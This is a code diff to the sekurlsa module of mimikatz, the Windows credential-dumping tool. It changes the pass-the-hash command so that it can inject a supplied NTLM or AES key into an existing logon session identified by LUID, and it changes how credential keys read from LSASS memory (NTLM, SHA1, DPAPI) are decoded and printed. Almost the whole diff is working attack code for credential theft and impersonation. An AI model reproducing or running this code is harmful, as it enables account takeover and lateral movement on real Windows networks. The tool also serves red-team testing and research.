@@ -190,7 +190,6 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 							else if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL))
 								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
 						#endif
-						
 						}
 						else
 						{
@@ -200,9 +199,16 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 					}
 					else
 					{
-						cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
-						cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
-						cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
+					#ifdef _M_IX86
+						if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
+							PRINT_ERROR(MIMIKATZ L" " MIMIKATZ_ARCH L" cannot access x64 process\n");
+						else
+					#endif
+						{						
+							cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
+							cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
+							cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
+						}
 					}
 					
 					if(!isError)
@@ -798,121 +804,141 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 	BYTE ntlm[LM_NTLM_HASH_LENGTH], aes128key[AES_128_KEY_LENGTH], aes256key[AES_256_KEY_LENGTH];
 	TOKEN_STATISTICS tokenStats;
 	SEKURLSA_PTH_DATA data = {&tokenStats.AuthenticationId, NULL, NULL, NULL, FALSE};
-	PCWCHAR szUser, szDomain, szRun, szNTLM, szAes128, szAes256;
+	PCWCHAR szUser, szDomain, szRun, szNTLM, szAes128, szAes256, szLuid = NULL;
 	DWORD dwNeededSize;
 	HANDLE hToken, hNewToken;
 	PROCESS_INFORMATION processInfos;
 	BOOL isImpersonate;
 
-	if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
+	if(kull_m_string_args_byName(argc, argv, L"luid", &szLuid, NULL))
 	{
-		if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
+		tokenStats.AuthenticationId.HighPart = 0; // because I never saw it != 0
+		tokenStats.AuthenticationId.LowPart = wcstoul(szLuid, NULL, 0);
+	}
+	else
+	{
+		if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
 		{
-			isImpersonate = kull_m_string_args_byName(argc, argv, L"impersonate", NULL, NULL);
+			if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
+			{
+				isImpersonate = kull_m_string_args_byName(argc, argv, L"impersonate", NULL, NULL);
 #pragma warning(push)
 #pragma warning(disable:4996)			
-			kull_m_string_args_byName(argc, argv, L"run", &szRun, isImpersonate ? _wpgmptr : L"cmd.exe");
+				kull_m_string_args_byName(argc, argv, L"run", &szRun, isImpersonate ? _wpgmptr : L"cmd.exe");
 #pragma warning(pop)
-			kprintf(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n", szUser, szDomain, szRun, isImpersonate ? L"yes" : L"no");
+				kprintf(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n", szUser, szDomain, szRun, isImpersonate ? L"yes" : L"no");
 
-			if(kull_m_string_args_byName(argc, argv, L"aes128", &szAes128, NULL))
-			{
-				if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
-				{
-					if(kull_m_string_stringToHex(szAes128, aes128key, AES_128_KEY_LENGTH))
-					{
-						data.Aes128Key = aes128key;
-						kprintf(L"AES128\t: "); kull_m_string_wprintf_hex(data.Aes128Key, AES_128_KEY_LENGTH, 0); kprintf(L"\n");
-					}
-					else PRINT_ERROR(L"AES128 key length must be 32 (16 bytes)\n");
-				}
-				else PRINT_ERROR(L"AES128 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
 			}
-
-			if(kull_m_string_args_byName(argc, argv, L"aes256", &szAes256, NULL))
-			{
-				if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
-				{
-					if(kull_m_string_stringToHex(szAes256, aes256key, AES_256_KEY_LENGTH))
-					{
-						data.Aes256Key = aes256key;
-						kprintf(L"AES256\t: "); kull_m_string_wprintf_hex(data.Aes256Key, AES_256_KEY_LENGTH, 0); kprintf(L"\n");
-					}
-					else PRINT_ERROR(L"AES256 key length must be 64 (32 bytes)\n");
-				}
-				else PRINT_ERROR(L"AES256 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
-			}
-
-			if(kull_m_string_args_byName(argc, argv, L"rc4", &szNTLM, NULL) || kull_m_string_args_byName(argc, argv, L"ntlm", &szNTLM, NULL))
-			{
-				if(kull_m_string_stringToHex(szNTLM, ntlm, LM_NTLM_HASH_LENGTH))
-				{
-					data.NtlmHash = ntlm;
-					kprintf(L"NTLM\t: "); kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
-				}
-				else PRINT_ERROR(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
-			}
-						
-			if(data.NtlmHash || data.Aes128Key || data.Aes256Key)
-			{
-				if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L"", &processInfos, FALSE))
-				{
-					kprintf(L"  |  PID  %u\n  |  TID  %u\n",processInfos.dwProcessId, processInfos.dwThreadId);
-					if(OpenProcessToken(processInfos.hProcess, TOKEN_READ | (isImpersonate ? TOKEN_DUPLICATE : 0), &hToken))
-					{
-						if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
-						{
-							kprintf(L"  |  LUID %u ; %u (%08x:%08x)\n", tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart, tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart);
-							kprintf(L"  \\_ msv1_0   - ");
-							kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_msv_pth, &data);
-							kprintf(L"\n");
-							kprintf(L"  \\_ kerberos - ");
-							kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_pth, &data);
-							kprintf(L"\n");
-
-							if(data.isReplaceOk)
-							{
-								if(isImpersonate)
-								{
-									if(DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityDelegation, TokenImpersonation, &hNewToken))
-									{
-										if(SetThreadToken(NULL, hNewToken))
-											kprintf(L"** Token Impersonation **\n");
-										else PRINT_ERROR_AUTO(L"SetThreadToken");
-										CloseHandle(hNewToken);
-									}
-									else PRINT_ERROR_AUTO(L"DuplicateTokenEx");
-									NtTerminateProcess(processInfos.hProcess, STATUS_SUCCESS);
-								}
-								else NtResumeProcess(processInfos.hProcess);
-							}
-							else NtTerminateProcess(processInfos.hProcess, STATUS_FATAL_APP_EXIT);
-						}
-						else PRINT_ERROR_AUTO(L"GetTokenInformation");
-						CloseHandle(hToken);
-					}
-					else PRINT_ERROR_AUTO(L"OpenProcessToken");
-					CloseHandle(processInfos.hThread);
-					CloseHandle(processInfos.hProcess);
-				}
-				else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
-			}
-			else PRINT_ERROR(L"Missing at least one argument : ntlm/rc4 OR aes128 OR aes256\n");
+			else PRINT_ERROR(L"Missing argument : domain\n");
 		}
-		else PRINT_ERROR(L"Missing argument : domain\n");
+		else PRINT_ERROR(L"Missing argument : user\n");
 	}
-	else PRINT_ERROR(L"Missing argument : user\n");
+
+	if(kull_m_string_args_byName(argc, argv, L"aes128", &szAes128, NULL))
+	{
+		if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
+		{
+			if(kull_m_string_stringToHex(szAes128, aes128key, AES_128_KEY_LENGTH))
+			{
+				data.Aes128Key = aes128key;
+				kprintf(L"AES128\t: "); kull_m_string_wprintf_hex(data.Aes128Key, AES_128_KEY_LENGTH, 0); kprintf(L"\n");
+			}
+			else PRINT_ERROR(L"AES128 key length must be 32 (16 bytes)\n");
+		}
+		else PRINT_ERROR(L"AES128 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
+	}
+
+	if(kull_m_string_args_byName(argc, argv, L"aes256", &szAes256, NULL))
+	{
+		if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
+		{
+			if(kull_m_string_stringToHex(szAes256, aes256key, AES_256_KEY_LENGTH))
+			{
+				data.Aes256Key = aes256key;
+				kprintf(L"AES256\t: "); kull_m_string_wprintf_hex(data.Aes256Key, AES_256_KEY_LENGTH, 0); kprintf(L"\n");
+			}
+			else PRINT_ERROR(L"AES256 key length must be 64 (32 bytes)\n");
+		}
+		else PRINT_ERROR(L"AES256 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
+	}
+
+	if(kull_m_string_args_byName(argc, argv, L"rc4", &szNTLM, NULL) || kull_m_string_args_byName(argc, argv, L"ntlm", &szNTLM, NULL))
+	{
+		if(kull_m_string_stringToHex(szNTLM, ntlm, LM_NTLM_HASH_LENGTH))
+		{
+			data.NtlmHash = ntlm;
+			kprintf(L"NTLM\t: "); kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+		}
+		else PRINT_ERROR(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
+	}
+
+	if(data.NtlmHash || data.Aes128Key || data.Aes256Key)
+	{
+		if(szLuid)
+		{
+			kprintf(L"mode\t: replacing NTLM/RC4 key in a session\n");
+			kuhl_m_sekurlsa_pth_luid(&data);
+		}
+		else
+		{
+			if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L"", &processInfos, FALSE))
+			{
+				kprintf(L"  |  PID  %u\n  |  TID  %u\n",processInfos.dwProcessId, processInfos.dwThreadId);
+				if(OpenProcessToken(processInfos.hProcess, TOKEN_READ | (isImpersonate ? TOKEN_DUPLICATE : 0), &hToken))
+				{
+					if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
+					{
+						kuhl_m_sekurlsa_pth_luid(&data);
+						if(data.isReplaceOk)
+						{
+							if(isImpersonate)
+							{
+								if(DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityDelegation, TokenImpersonation, &hNewToken))
+								{
+									if(SetThreadToken(NULL, hNewToken))
+										kprintf(L"** Token Impersonation **\n");
+									else PRINT_ERROR_AUTO(L"SetThreadToken");
+									CloseHandle(hNewToken);
+								}
+								else PRINT_ERROR_AUTO(L"DuplicateTokenEx");
+								NtTerminateProcess(processInfos.hProcess, STATUS_SUCCESS);
+							}
+							else NtResumeProcess(processInfos.hProcess);
+						}
+						else NtTerminateProcess(processInfos.hProcess, STATUS_FATAL_APP_EXIT);
+					}
+					else PRINT_ERROR_AUTO(L"GetTokenInformation");
+					CloseHandle(hToken);
+				}
+				else PRINT_ERROR_AUTO(L"OpenProcessToken");
+				CloseHandle(processInfos.hThread);
+				CloseHandle(processInfos.hProcess);
+			}
+			else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
+		}
+	}
+	else PRINT_ERROR(L"Missing at least one argument : ntlm/rc4 OR aes128 OR aes256\n");
 
 	return STATUS_SUCCESS;
+}
+
+VOID kuhl_m_sekurlsa_pth_luid(PSEKURLSA_PTH_DATA data)
+{
+	kprintf(L"  |  LUID %u ; %u (%08x:%08x)\n", data->LogonId->HighPart, data->LogonId->LowPart, data->LogonId->HighPart, data->LogonId->LowPart);
+	kprintf(L"  \\_ msv1_0   - ");
+	kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_msv_pth, data);
+	kprintf(L"\n");
+	kprintf(L"  \\_ kerberos - ");
+	kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_pth, data);
+	kprintf(L"\n");
 }
 
 VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, ULONG flags)
 {
 	PUNICODE_STRING username = NULL, domain = NULL, password = NULL;
-	PRPCE_CREDENTIAL_KEYCREDENTIAL pRpceCredentialKeyCreds;
+	PKIWI_CREDENTIAL_KEYS pKeys = NULL;
 	PKERB_HASHPASSWORD_GENERIC pHashPassword;
 	UNICODE_STRING buffer;
-	PVOID base;
 	DWORD type, i;
 	BOOL isNull = FALSE;
 	PWSTR sid = NULL;
@@ -960,10 +986,12 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 						else kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) (msvCredentials + pMSVHelper->offsetToIso + sizeof(USHORT)));
 						break;
 				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
-					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) msvCredentials;
-					base = (PBYTE) pRpceCredentialKeyCreds + sizeof(RPCE_CREDENTIAL_KEYCREDENTIAL) + (pRpceCredentialKeyCreds->unk0 - 1) * sizeof(MARSHALL_KEY);
-					for (i = 0; i < pRpceCredentialKeyCreds->unk0; i++)
-						kuhl_m_sekurlsa_genericKeyOutput(&pRpceCredentialKeyCreds->key[i], &base, sid);
+					if(kull_m_rpc_DecodeCredentialKeys(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length, &pKeys))
+					{
+						for(i = 0; i < pKeys->count; i++)
+							kuhl_m_sekurlsa_genericKeyOutput(&pKeys->keys[i], sid);
+						kull_m_rpc_FreeCredentialKeys(&pKeys);
+					}
 					break;
 				default:
 					kprintf(L"\n\t * Raw data : ");
@@ -1088,37 +1116,34 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 	else kprintf(L"LUID KO\n");
 }
 
-VOID kuhl_m_sekurlsa_genericKeyOutput(PMARSHALL_KEY key, PVOID * dirtyBase, LPCWSTR sid)
+VOID kuhl_m_sekurlsa_genericKeyOutput(PKIWI_CREDENTIAL_KEY key, LPCWSTR sid)
 {
-	PBYTE addr = (PBYTE) *dirtyBase + sizeof(ULONG);
-	if(key)
+	if(key && key->cbData)
 	{
 		switch(key->type)
 		{
 		case CREDENTIALS_KEY_TYPE_NTLM:
 			kprintf(L"\n\t * NTLM     : ");
 			if(sid)
-				kuhl_m_dpapi_oe_credential_add(sid, NULL, addr, NULL, NULL, NULL);
+				kuhl_m_dpapi_oe_credential_add(sid, NULL, key->pbData, NULL, NULL, NULL);
 			break;
 		case CREDENTIALS_KEY_TYPE_SHA1:
 			kprintf(L"\n\t * SHA1     : ");
 			if(sid)
-				kuhl_m_dpapi_oe_credential_add(sid, NULL, NULL, addr, NULL, NULL);
+				kuhl_m_dpapi_oe_credential_add(sid, NULL, NULL, key->pbData, NULL, NULL);
 			break;
 		case CREDENTIALS_KEY_TYPE_ROOTKEY:
 			kprintf(L"\n\t * RootKey  : ");
 			break;
 		case CREDENTIALS_KEY_TYPE_DPAPI_PROTECTION:
-		case 0x00040003:
 			kprintf(L"\n\t * DPAPI    : ");
 			if(sid)
-				kuhl_m_dpapi_oe_credential_add(sid, NULL, NULL, NULL, addr, NULL);
+				kuhl_m_dpapi_oe_credential_add(sid, NULL, NULL, NULL, key->pbData, NULL);
 			break;
 		default:
 			kprintf(L"\n\t * %08x : ", key->type);
 		}
-		kull_m_string_wprintf_hex(addr, key->size, 0);
-		*dirtyBase = addr + *(PULONG) *dirtyBase;
+		kull_m_string_wprintf_hex(key->pbData, key->cbData, 0);
 	}
 }
 
